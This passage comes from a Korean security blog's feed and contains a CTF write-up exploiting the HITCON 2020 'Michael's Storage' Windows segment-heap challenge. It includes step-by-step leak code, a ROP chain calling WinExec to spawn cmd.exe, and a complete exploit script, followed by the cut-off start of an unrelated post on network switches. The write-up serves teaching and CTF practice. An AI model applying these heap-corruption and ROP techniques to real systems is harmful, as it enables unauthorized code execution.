&#xC815;&#xBCF5;&#xD558;&#xAE30; Part 4 - HITCON 2020 Michael&#x2019;s Storage(2)</a><br>Hip&#xD558;&#xAC8C; Heap &#xC815;&#xBCF5;&#xD558;&#xAE30; Part 5 - HITCON 2020 Michael&#x2019;s Storage(3) &#x2190; Now!</p><p>&#xC774;&#xC804; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; vs subsegment &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD588;&#xC5C8;&#xC8E0;.  arbitrary read &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xD3B8;&#xD558;&#xAC8C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD568;&#xC218;&#xB85C; &#xAD6C;&#xD604;&#xD574;&#xBCFC;&#xAC8C;&#xC694;. &#xB364;&#xC73C;&#xB85C; &#xB098;&#xC911;&#xC5D0; &#xC4F8; arbitrary write&#xB3C4; <code>readmeme</code>&#xC758; <code>getvalue</code>&#xB97C; <code>setvalue</code> &#xD638;&#xCD9C;&#xB85C; &#xC218;&#xC815;&#xD574;  <code>writemem</code> &#xD568;&#xC218;&#xB3C4; &#xC815;&#xC758;&#xD574;&#xB193;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readmem</span>(<span class="hljs-params">addr</span>):</span>    setvalue(<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,currupt_ptr_off,addr)    getvalue(<span class="hljs-number">6</span>)    p.recvuntil(<span class="hljs-string">&quot;Value:&quot;</span>)    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">&quot;\r\n&quot;</span>)[:<span class="hljs-number">-2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)[:<span class="hljs-number">8</span>])<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writemem</span>(<span class="hljs-params">addr,data</span>):</span>    setvalue(<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,currupt_ptr_off,addr)    setvalue(<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,len(data)+<span class="hljs-number">1</span>,data)</code></pre><p>&#xC774;&#xC81C; <code>readmem</code>/<code>writemem</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; arbitrary read/write &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xBAA8;&#xB450; &#xC5BB;&#xC5C8;&#xB124;&#xC694;.</p><h2 id="Heap-base"><a href="#Heap-base" class="headerlink" title="Heap base"></a>Heap base</h2><p>&#xC774;&#xC81C; &#xAD6C;&#xD55C; vs subsegment &#xC8FC;&#xC18C;&#xB97C; &#xC774;&#xC6A9;&#xD574; heap base &#xC8FC;&#xC18C;(<a href="https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/#SEGMENT-HEAP">_SEGMENT_HEAP</a> &#xAD6C;&#xC870;&#xCCB4; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;)&#xB97C; &#xAD6C;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;.</p><p><img src="/2022/01/09/l0ch/segment-heap-part5/Untitled.png" alt="Untitled"></p><p> &#xAD6C;&#xD55C; vs subsegment &#xC8FC;&#xC18C;&#xB294; <a href="https://hackyboiz.github.io/2021/10/10/l0ch/segment-heap-part2/#HEAP-VS-SUBSEGMENT">_HEAP_VS_SUBSEGMENT</a> &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2022/01/09/l0ch/segment-heap-part5/Untitled%201.png" alt="Untitled"></p><p>vs subsegment &#xC8FC;&#xC18C;&#xC640; &#xC8FC;&#xC18C;&#xC758; &#xCCAB; 8 byte&#xC778; flink&#xAC12;&#xC744; xor &#xC5F0;&#xC0B0;&#xD558;&#xBA74; heap base(<a href="https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/#SEGMENT-HEAP">_SEGMENT_HEAP</a>)  &#xC8FC;&#xC18C;&#xB97C; leak&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2022/01/09/l0ch/segment-heap-part5/Untitled 6.png" alt="Untitled 6.png"></p><p>&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB85C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC4F8; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. </p><pre><code class="hljs python">vs_flink = readmem(vs_segment)VsContext = vs_flink ^ vs_segmentprint(hex(VsContext))heap_base = VsContext - <span class="hljs-number">0x2a0</span></code></pre><h2 id="ntdll"><a href="#ntdll" class="headerlink" title="ntdll"></a>ntdll</h2><p>heap base leak&#xB3C4; &#xD588;&#xC73C;&#xB2C8;&#xAE4C; ntdll &#xC8FC;&#xC18C;&#xAC00; &#xC5B4;&#xB514; &#xC788;&#xB098; &#xCC3E;&#xC544;&#xBD10;&#xC57C;&#xACA0;&#xC8E0;? ntdll &#xC8FC;&#xC18C;&#xB294; <a href="https://hackyboiz.github.io/2021/11/21/l0ch/segment-heap-part3/#HEAP-LFH-CONTEXT">_SEGMENT_HEAP&#x2192;LfhContext&#x2192;AffinityModArray</a>&#xC5D0;&#xC11C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAD6C;&#xD55C; heap base&#xC5D0;&#xC11C; <code>AffinityModArray</code>&#xAE4C;&#xC9C0;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xB354;&#xD55C; &#xC8FC;&#xC18C;&#xB97C; &#xC77D;&#xC73C;&#xBA74; ntdll&#xC744; leak&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694; </p><p><img src="/2022/01/09/l0ch/segment-heap-part5/Untitled%202.png" alt="Untitled"></p><p><code>AffinityModArray - 0x120a3f</code> &#xAC00; ntdll&#xC758; base &#xC8FC;&#xC18C;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">LfhContext = heap_base + <span class="hljs-number">0x340</span>print(hex(LfhContext))AffinityModArray = readmem(LfhContext+<span class="hljs-number">0x32</span>) &lt;&lt; <span class="hljs-number">16</span>ntdll = AffinityModArray - <span class="hljs-number">0x120000</span>print(<span class="hljs-string">&quot;ntdll: &quot;</span>+ hex(ntdll))</code></pre><p>&#xC81C; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; <code>AffinityModArray</code>  &#xC8FC;&#xC18C;&#xAC12;&#xC5D0; <code>0x0a</code>&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xC911;&#xAC04;&#xC5D0; &#xCD9C;&#xB825;&#xC774; &#xC9E4;&#xB9AC;&#xB354;&#xB77C;&#xAD6C;&#xC694;&#x3160; &#xADF8;&#xB798;&#xC11C; <code>0x0a</code>&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xD558;&#xC704; 2&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xBC84;&#xB9AC;&#xACE0; &#xB098;&#xBA38;&#xC9C0;&#xB97C; &#xAC00;&#xC838;&#xC628; &#xB2E4;&#xC74C; &#xC790;&#xB9AC;&#xC218;&#xB97C; &#xB9DE;&#xCDB0;&#xC8FC;&#xC5B4; ntdll base &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2022/01/09/l0ch/segment-heap-part5/Untitled 7.png" alt="Untitled 7"></p><h2 id="imagebase-kernel32-stack"><a href="#imagebase-kernel32-stack" class="headerlink" title="imagebase/kernel32/stack"></a>imagebase/kernel32/stack</h2><p>&#xC774;&#xD6C4;&#xC5D0;&#xB294; &#xC774;&#xC804; &#xC5F0;&#xAD6C;&#xAE00; &#xC911; NT Heap&#xC744; &#xB2E4;&#xB8E8;&#xB294; &#xC708;&#xB3C4;&#xC6B0; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5C8;&#xB358; &#xAC83;&#xCC98;&#xB7FC; &#xD544;&#xC694;&#xD55C; &#xB098;&#xBA38;&#xC9C0; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; &#xAD6C;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;! &#xAD6C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xC544;&#xB798; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0; &#xC124;&#xBA85;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xB2C8; &#xB530;&#xB85C; &#xC124;&#xBA85;&#xC5C6;&#xC774; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC640; &#xACB0;&#xACFC;&#xB9CC;.. &#xC808;&#xB300; &#xC775;&#xC2A4; &#xACFC;&#xC815; &#xB2E4;&#xC2DC; &#xC4F0;&#xAE30; &#xADC0;&#xCC2E;&#xC544;&#xC11C; &#xB9C1;&#xD06C;&#xB85C; &#xB300;&#xCCB4;&#xD55C;&#xAC70; &#xB9DE;&#xC74C;(?) </p><blockquote><p><a href="https://hackyboiz.github.io/2021/04/18/l0ch/pwncoolsexy-part4/#Imagebase">[Research] Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 4 - HITCON 2019 dadadb</a></p></blockquote><p>&#xB9C1;&#xD06C;&#xB97C; &#xCC38;&#xACE0;&#xD574; &#xB098;&#xBA38;&#xC9C0; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; &#xAD6C;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><ul><li>&#xBC14;&#xC774;&#xB108;&#xB9AC; imagebase</li><li>kernel32 base, WinExec</li><li>stack</li></ul><pre><code class="hljs python"><span class="hljs-comment"># leak binary imagebase</span>pebldr = ntdll+<span class="hljs-number">0x16a4c0</span>immol = readmem(pebldr + <span class="hljs-number">0x20</span>)imagebase = readmem(immol+<span class="hljs-number">0x28</span>) - <span class="hljs-number">0x2364</span>print(hex(imagebase))<span class="hljs-comment"># leak kernel32 base, winexec address</span>iat = imagebase + <span class="hljs-number">0x3000</span>readfile = readmem(iat)kernel32 = readfile - <span class="hljs-number">0x24ee0</span>winexec = kernel32 + <span class="hljs-number">0x67200</span><span class="hljs-comment"># leak stack</span>peb = readmem(ntdll + <span class="hljs-number">0x16a428</span>) - <span class="hljs-number">0x240</span>teb = peb+<span class="hljs-number">0x1000</span>stack = readmem(teb+<span class="hljs-number">0x11</span>) &lt;&lt; <span class="hljs-number">8</span>stack_end = stack + (<span class="hljs-number">0x10000</span> - (stack &amp; <span class="hljs-number">0xffff</span>))print(<span class="hljs-string">&quot;binary imagebase: &quot;</span>+ hex(imagebase))print(<span class="hljs-string">&quot;kernel32: &quot;</span>+hex(kernel32))print(<span class="hljs-string">&quot;peb:&quot;</span> +hex(peb))print(<span class="hljs-string">&quot;teb:&quot;</span> +hex(teb))print(<span class="hljs-string">&quot;stack:&quot;</span>+hex(stack))</code></pre><p><img src="/2022/01/09/l0ch/segment-heap-part5/Untitled%203.png" alt="Untitled"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>&#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC18C;&#xB97C; &#xBAA8;&#xB450; &#xAD6C;&#xD588;&#xC73C;&#xBA74; &#xC775;&#xC2A4;&#xB294; &#xAC04;&#xB2E8;&#xD55C; ROP&#xC785;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; arbitrary read&#xB97C; &#xC774;&#xC6A9;&#xD574; return address&#xAC00; &#xC800;&#xC7A5;&#xB41C; &#xC2A4;&#xD0DD;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2022/01/09/l0ch/segment-heap-part5/Untitled%204.png" alt="Untitled"></p><p><code>binary + 0x1ca7</code> &#xC740; &#xBC14;&#xB85C; &#xC9C1;&#xC804; &#xD638;&#xCD9C;&#xB41C; <code>sub_1060</code> &#xD568;&#xC218;&#xC758; return address&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xC8FC;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;. &#xC2A4;&#xD0DD; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xACE0; &#xC788;&#xC73C;&#xB2C8; &#xC2A4;&#xD0DD;&#xC5D0;&#xC11C; <code>binary + 0x1ca7</code> &#xAC12;&#xC774; &#xC800;&#xC7A5;&#xB41C; &#xC8FC;&#xC18C;&#xB97C; &#xCC3E;&#xC73C;&#xBA74; &#xADF8; &#xC8FC;&#xC18C;&#xAC00; return address &#xC8FC;&#xC18C;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. </p><pre><code class="hljs python"><span class="hljs-comment"># find return address to overwrite</span>ret_addr = imagebase + <span class="hljs-number">0x1ca7</span>start_addr = stack_end - <span class="hljs-number">8</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x200</span>):    addr = start_addr - <span class="hljs-number">8</span>*i    <span class="hljs-keyword">if</span> readmem(addr) == ret_addr:        ret = addr        <span class="hljs-keyword">break</span></code></pre><p>&#xC544;&#xAE4C; &#xBB38;&#xC790;&#xC5F4; &#xCCAD;&#xD06C; <code>cmd.exe</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC2E4;&#xD589;&#xD560; cmd &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; <code>.data</code> &#xC139;&#xC158;&#xC5D0; &#xC368;&#xC900;&#xB2E4;&#xC74C;, &#xAC00;&#xC82F;&#xC744; &#xAD6C;&#xD574; &#xAD6C;&#xC131;&#xD55C; ROP &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; ret &#xC8FC;&#xC18C;&#xC5D0; overwrite&#xD558;&#xBA74;?</p><pre><code class="hljs python">buf = imagebase + <span class="hljs-number">0x5800</span>writemem(buf,<span class="hljs-string">&quot;C:\\Windows\\system32\\cmd.exe\x00&quot;</span>)ret_gadget = imagebase + <span class="hljs-number">0x1b11</span>pop_rcx = ntdll + <span class="hljs-number">0x8c541</span> <span class="hljs-comment"># pop rcx; pop r8; pop r9; pop r10; pop r11; ret</span>rop = p64(pop_rcx) + p64(buf) +<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">32</span>+ p64(ret_gadget) + p64(winexec)  + <span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">8</span>writemem(ret,p64(ret_gadget)*<span class="hljs-number">10</span> + rop)p.interactive()</code></pre><p><img src="/2022/01/09/l0ch/segment-heap-part5/Untitled%205.png" alt="Untitled"></p><p><code>cmd.exe</code>&#xAC00; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xACE0; <code>type flag.txt</code>&#xB85C;  <code>hitcon{test}</code> &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! </p><p>segment heap&#xC744; &#xC774;&#xD574;&#xD558;&#xACE0; overlap chunk&#xB9CC; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB2E4;&#xBA74; &#xC775;&#xC2A4; &#xACFC;&#xC815;&#xC740; &#xC9C1;&#xAD00;&#xC801;&#xC774;&#xACE0; &#xC26C;&#xC6B4; &#xBB38;&#xC81C;&#xC600;&#xB2E4;&#xACE0; &#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. </p><h1 id="&#xC804;&#xCCB4;-&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;"><a href="#&#xC804;&#xCCB4;-&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;" class="headerlink" title="&#xC804;&#xCCB4; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;"></a>&#xC804;&#xCCB4; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> * <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloc</span>(<span class="hljs-params">types,size</span>):</span>p.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Type of storage:&quot;</span>)p.sendline(str(types))p.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)p.sendline(str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getvalue</span>(<span class="hljs-params">storage_idx</span>):</span>    p.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)    p.recvuntil(<span class="hljs-string">&quot;Storage index:&quot;</span>)    p.sendline(str(storage_idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">destory</span>(<span class="hljs-params">storage_idx</span>):</span>    p.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)    p.sendline(<span class="hljs-string">&quot;4&quot;</span>)    p.recvuntil(<span class="hljs-string">&quot;Storage index:&quot;</span>)    p.sendline(str(storage_idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setvalue</span>(<span class="hljs-params">storage_idx, chunk_type, idx,data</span>):</span>p.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)p.sendline(<span class="hljs-string">&quot;2&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Storage index:&quot;</span>)p.sendline(str(storage_idx))<span class="hljs-keyword">if</span> chunk_type == <span class="hljs-number">3</span>:p.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)p.sendline(str(idx))p.recvuntil(<span class="hljs-string">&quot;Value:&quot;</span>)p.sendline(data)<span class="hljs-keyword">else</span>:p.recvuntil(<span class="hljs-string">&quot;Index:&quot;</span>)p.sendline(str(idx))p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(str(data))        context.log_level =<span class="hljs-string">&quot;debug&quot;</span>context.arch = <span class="hljs-string">&quot;amd64&quot;</span>p = process(<span class="hljs-string">&quot;./MichaelStorage.exe&quot;</span>)<span class="hljs-comment">#windbgx.attach(p)#, script=&quot;ba 00007ff6`aa6d1ca7&quot;)</span><span class="hljs-comment"># 00007ff6`aa6d0000</span>alloc(<span class="hljs-number">0</span>,<span class="hljs-number">0x8000</span>) <span class="hljs-comment"># int 0</span>alloc(<span class="hljs-number">1</span>,<span class="hljs-number">0x1337</span>) <span class="hljs-comment"># secret 1</span>alloc(<span class="hljs-number">0</span>,<span class="hljs-number">0x8000</span>) <span class="hljs-comment"># int 2</span>alloc(<span class="hljs-number">3</span>,<span class="hljs-number">0x20000</span><span class="hljs-number">-1</span>) <span class="hljs-comment"># str 3 (overlap chunk)</span>alloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x3bd0</span>) <span class="hljs-comment">#int 4 </span>alloc(<span class="hljs-number">0</span>,<span class="hljs-number">0x8000</span>) <span class="hljs-comment"># int 5</span><span class="hljs-comment"># 0x1f017900000 : _HEAP_PAGE_SEGMENT -&gt; Segment base</span><span class="hljs-comment"># segment base + 0x23050 : chunk 2(secret storage)</span><span class="hljs-comment"># segment base + 34010 : chunk 3(int storage)</span>secret_off = <span class="hljs-number">0x23050</span>int_1_size_off = <span class="hljs-number">0x2010</span>target_seg_desc_off = <span class="hljs-number">0x698</span>setvalue(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>, -((secret_off-target_seg_desc_off)/<span class="hljs-number">8</span>)<span class="hljs-number">-1</span>,<span class="hljs-number">0x4204ffbd00000103</span>) <span class="hljs-comment"># overwrite size type 1 0x21-&gt;0x42</span>destory(<span class="hljs-number">2</span>) <span class="hljs-comment"># free 0x42 </span>alloc(<span class="hljs-number">0</span>,<span class="hljs-number">0x8000</span>) <span class="hljs-comment"># int 2 (realloc)</span>alloc(<span class="hljs-number">3</span>,<span class="hljs-number">0x200</span>) <span class="hljs-comment"># str 6</span>alloc(<span class="hljs-number">1</span>,<span class="hljs-number">0xbeef</span>) <span class="hljs-comment"># secret 7</span>setvalue(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0x40</span>+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x40</span>)currupt_size_off = <span class="hljs-number">-0x4b</span>currupt_ptr_off = <span class="hljs-number">-0x4a</span>setvalue(<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,currupt_size_off,<span class="hljs-number">0x6161616161616161</span>)getvalue(<span class="hljs-number">3</span>)p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x48</span>)vs_segment = u64(p.recvuntil(<span class="hljs-string">&quot;\r\n&quot;</span>)[:<span class="hljs-number">-2</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>)) - <span class="hljs-number">0x80</span>print(<span class="hljs-string">&quot;vs_segment:&quot;</span>,hex(vs_segment))setvalue(<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,currupt_size_off,<span class="hljs-number">0x200</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readmem</span>(<span class="hljs-params">addr</span>):</span>    setvalue(<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,currupt_ptr_off,addr)    getvalue(<span class="hljs-number">6</span>)    p.recvuntil(<span class="hljs-string">&quot;Value:&quot;</span>)    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">&quot;\r\n&quot;</span>)[:<span class="hljs-number">-2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)[:<span class="hljs-number">8</span>])<span class="hljs-comment"># leak haep base</span>vs_flink = readmem(vs_segment)VsContext = vs_flink ^ vs_segmentprint(hex(VsContext))heap_base = VsContext - <span class="hljs-number">0x2a0</span><span class="hljs-comment"># leak ntdll base</span><span class="hljs-comment"># _SEGMENT_HEAP -&gt; LfhContext -&gt; AffinityModArray</span>LfhContext = heap_base + <span class="hljs-number">0x340</span>print(hex(LfhContext))AffinityModArray = readmem(LfhContext+<span class="hljs-number">0x32</span>) &lt;&lt; <span class="hljs-number">16</span>print(hex(AffinityModArray))ntdll = AffinityModArray - <span class="hljs-number">0x120000</span><span class="hljs-comment"># leak binary imagebase</span>pebldr = ntdll+<span class="hljs-number">0x16a4c0</span>immol = readmem(pebldr + <span class="hljs-number">0x20</span>)imagebase = readmem(immol+<span class="hljs-number">0x28</span>) - <span class="hljs-number">0x2364</span>print(hex(imagebase))<span class="hljs-comment"># leak kernel32 base, winexec address</span>iat = imagebase + <span class="hljs-number">0x3000</span>readfile = readmem(iat)kernel32 = readfile - <span class="hljs-number">0x24ee0</span>winexec = kernel32 + <span class="hljs-number">0x67200</span><span class="hljs-comment"># leak stack</span>peb = readmem(ntdll + <span class="hljs-number">0x16a428</span>) - <span class="hljs-number">0x240</span>teb = peb+<span class="hljs-number">0x1000</span>stack = readmem(teb+<span class="hljs-number">0x11</span>) &lt;&lt; <span class="hljs-number">8</span>stack_end = stack + (<span class="hljs-number">0x10000</span> - (stack &amp; <span class="hljs-number">0xffff</span>))print(<span class="hljs-string">&quot;binary imagebase: &quot;</span>+ hex(imagebase))print(<span class="hljs-string">&quot;kernel32: &quot;</span>+hex(kernel32))print(<span class="hljs-string">&quot;peb:&quot;</span> +hex(peb))print(<span class="hljs-string">&quot;teb:&quot;</span> +hex(teb))print(<span class="hljs-string">&quot;stack:&quot;</span>+hex(stack))<span class="hljs-comment"># find return address to overwrite</span>ret_addr = imagebase + <span class="hljs-number">0x1ca7</span>start_addr = stack_end - <span class="hljs-number">8</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x200</span>):    addr = start_addr - <span class="hljs-number">8</span>*i    <span class="hljs-keyword">if</span> readmem(addr) == ret_addr:        ret = addr        <span class="hljs-keyword">break</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writemem</span>(<span class="hljs-params">addr,data</span>):</span>    setvalue(<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,currupt_ptr_off,addr)    setvalue(<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,len(data)+<span class="hljs-number">1</span>,data)buf = imagebase + <span class="hljs-number">0x5800</span>writemem(buf,<span class="hljs-string">&quot;C:\\Windows\\system32\\cmd.exe\x00&quot;</span>)ret_gadget = imagebase + <span class="hljs-number">0x1b11</span>pop_rcx = ntdll + <span class="hljs-number">0x8c541</span> <span class="hljs-comment"># pop rcx; pop r8; pop r9; pop r10; pop r11; ret</span>rop = p64(pop_rcx) + p64(buf) +<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">32</span>+ p64(ret_gadget) + p64(winexec)  + <span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">8</span>writemem(ret,p64(ret_gadget)*<span class="hljs-number">10</span> + rop)p.interactive()</code></pre><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>part 1&#xC774; &#xC62C;&#xB77C;&#xC628; &#xB0A0;&#xC774; 9&#xC6D4;&#xC774;&#xC5C8;&#xB294;&#xB370;, &#xD574;&#xAC00; &#xC9C0;&#xB098;&#xC11C;&#xC57C; &#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.. &#xAC8C;&#xC73C;&#xB978; &#xC800;&#xB97C; &#xBC18;&#xC131;&#xD558;&#xBA70; &#xB2E4;&#xC74C; &#xC5F0;&#xAD6C;&#xAE00;&#xB85C; &#xCC3E;&#xC544;&#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#x3160;&#x3160; 2022&#xB144;&#xC5D0;&#xB3C4; &#xC5F4;&#xC2EC;&#xD788; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD574;&#xC694; :) &#xC548;&#xB155;!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap/">heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/hitcon/">hitcon</category>
      
      <category domain="https://hackyboiz.github.io/tags/segment-heap/">segment heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows-10/">windows 10</category>
      
      
      <comments>https://hackyboiz.github.io/2022/01/09/l0ch/segment-heap-part5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Network Switch(L2, L3, L4, L7)</title>
      <link>https://hackyboiz.github.io/2022/01/07/nanglam/network-switch/</link>
      <guid>https://hackyboiz.github.io/2022/01/07/nanglam/network-switch/</guid>
      <pubDate>Fri, 07 Jan 2022 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xB124;&amp;#xD2B8;&amp;#xC6CC;&amp;#xD06C; &amp;#xC2A4;&amp;#xC704;&amp;#xCE58;(Network Switch)&amp;#xB294; &amp;#xB124;&amp;#xD2B8;&amp;#xC6CC;&amp;#xD06C; &amp;#xB2E8;&amp;#xC704;&amp;#xB4E</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC2A4;&#xC704;&#xCE58;(Network Switch)&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xB2E8;&#xC704;&#xB4E4;&#xC744; &#xC5F0;&#xACB0;&#xD558;&#xB294; &#xD1B5;&#xC2E0; &#xC7A5;&#xBE44;&#xB85C; &#xD5C8;&#xBE0C;&#xBCF4;&#xB2E4; &#xC804;&#xC1A1; &#xC18D;&#xB3C4;&#xAC00; &#xAC1C;&#xC120;&#xB41C; &#xC7A5;&#xBE44;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2022/01/07/nanglam/network-switch/image1.png" alt></p><p>&#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC2A4;&#xC704;&#xCE58;&#xB294; &#xD328;&#xD0B7;&#xC744; &#xC5B4;&#xB290; &#xCABD;&#xC73C;&#xB85C; &#xBCF4;&#xB0B4;&#xB294;&#xC9C0; &#xC815;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD328;&#xD0B7;&#xC744; &#xC804;&#xC1A1;&#xD560; &#xB54C; &#xC5B4;&#xB5A0;&#xD55C; &#xC815;&#xBCF4;&#xB97C; 